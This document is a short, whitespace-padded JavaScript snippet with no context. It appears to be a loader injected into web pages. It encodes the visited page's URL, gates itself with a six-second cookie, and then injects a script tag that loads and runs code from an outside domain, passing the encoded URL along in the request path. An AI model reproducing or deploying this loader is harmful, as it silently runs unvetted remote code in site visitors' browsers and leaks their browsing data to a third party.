campaign =btoa(document.URL);                             characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';                             result = '';                             charactersLength = characters.length;                             for (i = 0; i < 10; i++ )                             {                                result += characters.charAt(Math.floor(Math.random() * charactersLength));                             }                             if(document.cookie.indexOf("uCtrl2=1") == -1)                             {                              var date = new Date();                              date.setTime(date.getTime()+(6*1000));                              var expires = "; expires="+date.toGMTString();                              document.cookie = "uCtrl2=1;"+expires+"; path=/";                                                            script = document.createElement('script');                               script.src ='https://static.targethaus.net/campaign_name_'+result+campaign+'.js';                              document.head.appendChild(script);                             }